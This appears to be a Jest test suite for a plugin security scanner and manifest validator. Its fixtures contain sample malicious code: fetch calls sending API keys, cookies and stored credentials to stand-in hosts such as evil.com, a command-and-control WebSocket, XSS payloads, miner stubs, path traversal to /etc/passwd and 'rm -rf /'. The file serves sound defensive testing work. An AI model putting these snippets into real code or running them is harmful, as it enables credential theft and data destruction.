import { PluginSecurityScanner } from '../plugin-security-scanner';
import { PluginManifestValidator } from '../plugin-manifest-validator';
import fs from 'fs/promises';
import path from 'path';
import os from 'os';

describe('Plugin Security Tests', () => {
  let tempDir: string;
  let scanner: PluginSecurityScanner;
  let validator: PluginManifestValidator;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'plugin-test-'));
    scanner = new PluginSecurityScanner();
    validator = new PluginManifestValidator();
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  describe('Malicious Code Detection', () => {
    it('should detect eval() usage', async () => {
      const maliciousCode = `
        function stealData() {
          const apiKey = eval('process.env.BTCPAYSERVER_API_KEY');
          fetch('https://evil.com/steal', { 
            method: 'POST', 
            body: JSON.stringify({ key: apiKey })
          });
        }
      `;

      await fs.writeFile(path.join(tempDir, 'index.js'), maliciousCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'evil-plugin',
        name: 'Evil Plugin',
        version: '1.0.0',
        description: 'Malicious plugin',
        author: 'Hacker'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('eval') && i.severity === 'critical'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('Environment variable') && i.severity === 'critical'
      )).toBe(true);
    });

    it('should detect attempts to access file system', async () => {
      const maliciousCode = `
        const fs = require('fs');
        const path = require('path');
        
        function readSecrets() {
          const envFile = fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8');
          return envFile;
        }
      `;

      await fs.writeFile(path.join(tempDir, 'steal.js'), maliciousCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'fs-access',
        name: 'FS Access',
        version: '1.0.0',
        description: 'File system access attempt',
        author: 'Hacker'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('File system') && i.severity === 'critical'
      )).toBe(true);
    });

    it('should detect XSS attempts', async () => {
      const xssCode = `
        function injectXSS() {
          document.body.innerHTML = '<img src=x onerror="alert(document.cookie)">';
          
          const script = document.createElement('script');
          script.innerHTML = 'fetch("/api/steal", {method: "POST", body: document.cookie})';
          document.head.appendChild(script);
        }
      `;

      await fs.writeFile(path.join(tempDir, 'xss.js'), xssCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'xss-plugin',
        name: 'XSS Plugin',
        version: '1.0.0',
        description: 'XSS attack attempt',
        author: 'Hacker'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('innerHTML') && i.severity === 'high'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('Cookie access') && i.severity === 'critical'
      )).toBe(true);
    });

    it('should detect crypto mining code', async () => {
      const miningCode = `
        import CryptoJS from 'crypto-js';
        
        function startMining() {
          const miner = new CryptoNight.User('site-key', 'monero-address');
          miner.start();
          
          // Or WebAssembly mining
          WebAssembly.instantiate(wasmCode).then(result => {
            result.instance.exports.mine();
          });
        }
      `;

      await fs.writeFile(path.join(tempDir, 'miner.js'), miningCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'crypto-miner',
        name: 'Crypto Miner',
        version: '1.0.0',
        description: 'Hidden crypto miner',
        author: 'Miner'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('crypto mining') && i.severity === 'critical'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('WebAssembly') && i.severity === 'high'
      )).toBe(true);
    });

    it('should detect obfuscated code', async () => {
      const obfuscatedCode = `
        const _0x4e2c=['log','Hello','World'];
        const _0x5a1b=function(_0x4e2cx2,_0x4e2cx3){
          _0x4e2cx2=_0x4e2cx2-0x0;
          const _0x4e2cx4=_0x4e2c[_0x4e2cx2];
          return _0x4e2cx4;
        };
        console[_0x5a1b('0x0')](_0x5a1b('0x1')+_0x5a1b('0x2'));
        
        // Hex encoded malicious code
        eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29));
      `;

      await fs.writeFile(path.join(tempDir, 'obfuscated.js'), obfuscatedCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'obfuscated',
        name: 'Obfuscated Plugin',
        version: '1.0.0',
        description: 'Obfuscated code',
        author: 'Unknown'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.type === 'obfuscation'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('fromCharCode')
      )).toBe(true);
    });

    it('should detect attempts to access localStorage and IndexedDB', async () => {
      const storageCode = `
        function stealData() {
          // Try to access main app's localStorage
          const apiKey = localStorage.getItem('btcpay_api_key');
          const settings = localStorage.getItem('app_settings');
          
          // Try to access IndexedDB
          const request = indexedDB.open('BTCPayDB');
          request.onsuccess = function(event) {
            const db = event.target.result;
            const transaction = db.transaction(['credentials'], 'readonly');
            const store = transaction.objectStore('credentials');
            const getAllRequest = store.getAll();
            
            getAllRequest.onsuccess = function() {
              fetch('https://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify(getAllRequest.result)
              });
            };
          };
        }
      `;

      await fs.writeFile(path.join(tempDir, 'storage.js'), storageCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'storage-thief',
        name: 'Storage Thief',
        version: '1.0.0',
        description: 'Attempts to steal stored data',
        author: 'Thief'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('LocalStorage') && i.severity === 'high'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('IndexedDB') && i.severity === 'high'
      )).toBe(true);
    });

    it('should detect prototype pollution attempts', async () => {
      const pollutionCode = `
        function pollute() {
          Object.prototype.isAdmin = true;
          Object.prototype.apiKey = 'stolen-key';
          
          const obj = {};
          obj.__proto__.polluted = true;
          
          const constructor = obj.constructor;
          constructor.prototype.hacked = true;
        }
      `;

      await fs.writeFile(path.join(tempDir, 'pollution.js'), pollutionCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'prototype-pollution',
        name: 'Prototype Pollution',
        version: '1.0.0',
        description: 'Prototype pollution attack',
        author: 'Attacker'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('prototype pollution') && i.severity === 'high'
      )).toBe(true);
    });

    it('should detect suspicious network requests', async () => {
      const networkCode = `
        async function exfiltrate() {
          // Fetch to suspicious domain
          await fetch('https://evil-tracker.com/collect', {
            method: 'POST',
            body: JSON.stringify({ 
              url: window.location.href,
              cookies: document.cookie 
            })
          });
          
          // WebSocket to command & control
          const ws = new WebSocket('wss://c2-server.evil/control');
          ws.onopen = () => {
            ws.send(JSON.stringify({ type: 'register', data: navigator.userAgent }));
          };
          
          // Create hidden iframe
          const iframe = document.createElement('iframe');
          iframe.src = 'https://malicious-site.com/payload';
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
        }
      `;

      await fs.writeFile(path.join(tempDir, 'network.js'), networkCode);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'network-spy',
        name: 'Network Spy',
        version: '1.0.0',
        description: 'Suspicious network activity',
        author: 'Spy'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('WebSocket') && i.severity === 'high'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('Cookie access') && i.severity === 'critical'
      )).toBe(true);
    });
  });

  describe('Manifest Validation', () => {
    it('should reject manifest with invalid permissions', () => {
      const manifest = {
        id: 'bad-perms',
        name: 'Bad Permissions',
        version: '1.0.0',
        description: 'Invalid permissions',
        author: 'Test',
        requiredPermissions: [
          {
            permission: 'btcpay.admin.deleteeverything',
            description: 'Delete everything',
            required: true
          }
        ]
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => 
        e.field.includes('permission') && e.message.includes('Invalid')
      )).toBe(true);
    });

    it('should warn about dangerous permissions', () => {
      const manifest = {
        id: 'dangerous-perms',
        name: 'Dangerous Permissions',
        version: '1.0.0',
        description: 'Requests dangerous permissions',
        author: 'Test',
        requiredPermissions: [
          {
            permission: 'btcpay.server.canmodifyserversettings',
            description: 'Modify server settings',
            required: true
          }
        ]
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(true);
      expect(result.warnings.some(w => 
        w.field.includes('permission') && w.message.includes('Dangerous')
      )).toBe(true);
    });

    it('should reject manifest with invalid ID format', () => {
      const manifest = {
        id: 'Invalid ID With Spaces!',
        name: 'Invalid ID',
        version: '1.0.0',
        description: 'Invalid ID format',
        author: 'Test'
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => 
        e.field === 'id' && e.message.includes('lowercase')
      )).toBe(true);
    });

    it('should reject manifest with path traversal in main', () => {
      const manifest = {
        id: 'path-traversal',
        name: 'Path Traversal',
        version: '1.0.0',
        description: 'Path traversal attempt',
        author: 'Test',
        main: '../../../etc/passwd'
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => 
        e.field === 'main' && e.message.includes('valid file path')
      )).toBe(true);
    });

    it('should warn about suspicious content in description', () => {
      const manifest = {
        id: 'suspicious',
        name: 'Suspicious Plugin',
        version: '1.0.0',
        description: 'This plugin will hack your BTCPay server and bypass all security!',
        author: 'Hacker'
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(true);
      expect(result.warnings.some(w => 
        w.field === 'description' && w.message.includes('suspicious')
      )).toBe(true);
    });

    it('should warn about suspicious dependencies', () => {
      const manifest = {
        id: 'bad-deps',
        name: 'Bad Dependencies',
        version: '1.0.0',
        description: 'Has suspicious dependencies',
        author: 'Test',
        dependencies: {
          'child_process': '^1.0.0',
          'node-ssh': '^2.0.0',
          'shelljs': '^0.8.0'
        }
      };

      const result = validator.validate(manifest);
      
      expect(result.valid).toBe(true);
      expect(result.warnings.filter(w => 
        w.field.includes('dependencies') && w.message.includes('suspicious')
      ).length).toBeGreaterThan(0);
    });
  });

  describe('Suspicious File Detection', () => {
    it('should detect executable files', async () => {
      await fs.writeFile(path.join(tempDir, 'malware.exe'), Buffer.from([0x4D, 0x5A])); // MZ header
      await fs.writeFile(path.join(tempDir, 'backdoor.dll'), Buffer.from([0x4D, 0x5A]));
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'executable',
        name: 'Executable',
        version: '1.0.0',
        description: 'Contains executables',
        author: 'Test'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('Executable') && i.severity === 'critical'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('DLL') && i.severity === 'critical'
      )).toBe(true);
    });

    it('should detect WebAssembly files', async () => {
      // WebAssembly magic number
      await fs.writeFile(
        path.join(tempDir, 'miner.wasm'), 
        Buffer.from([0x00, 0x61, 0x73, 0x6D])
      );
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'wasm',
        name: 'WebAssembly',
        version: '1.0.0',
        description: 'Contains WebAssembly',
        author: 'Test'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('WebAssembly') && i.severity === 'high'
      )).toBe(true);
    });

    it('should detect shell scripts', async () => {
      await fs.writeFile(path.join(tempDir, 'exploit.sh'), '#!/bin/bash\nrm -rf /');
      await fs.writeFile(path.join(tempDir, 'backdoor.ps1'), 'Invoke-WebRequest -Uri "http://evil.com"');
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'scripts',
        name: 'Scripts',
        version: '1.0.0',
        description: 'Contains shell scripts',
        author: 'Test'
      }));

      const result = await scanner.scanPlugin(tempDir);
      
      expect(result.passed).toBe(false);
      expect(result.issues.some(i => 
        i.message.includes('Shell script') && i.severity === 'high'
      )).toBe(true);
      expect(result.issues.some(i => 
        i.message.includes('PowerShell') && i.severity === 'high'
      )).toBe(true);
    });
  });

  describe('Security Score Calculation', () => {
    it('should calculate appropriate security scores', async () => {
      // Clean plugin
      await fs.writeFile(path.join(tempDir, 'index.js'), `
        export function render() {
          return React.createElement('div', null, 'Hello World');
        }
      `);
      await fs.writeFile(path.join(tempDir, 'manifest.json'), JSON.stringify({
        id: 'clean-plugin',
        name: 'Clean Plugin',
        version: '1.0.0',
        description: 'A clean, safe plugin',
        author: 'Developer'
      }));

      const cleanResult = await scanner.scanPlugin(tempDir);
      expect(cleanResult.score).toBeGreaterThanOrEqual(90);
      expect(cleanResult.passed).toBe(true);

      // Suspicious plugin
      await fs.writeFile(path.join(tempDir, 'suspicious.js'), `
        fetch('https://external-api.com/track');
        const data = localStorage.getItem('data');
      `);

      const suspiciousResult = await scanner.scanPlugin(tempDir);
      expect(suspiciousResult.score).toBeLessThan(90);
      expect(suspiciousResult.score).toBeGreaterThan(50);

      // Malicious plugin
      await fs.writeFile(path.join(tempDir, 'malicious.js'), `
        eval('alert(1)');
        document.cookie;
        process.env.API_KEY;
      `);

      const maliciousResult = await scanner.scanPlugin(tempDir);
      expect(maliciousResult.score).toBeLessThan(50);
      expect(maliciousResult.passed).toBe(false);
    });
  });
});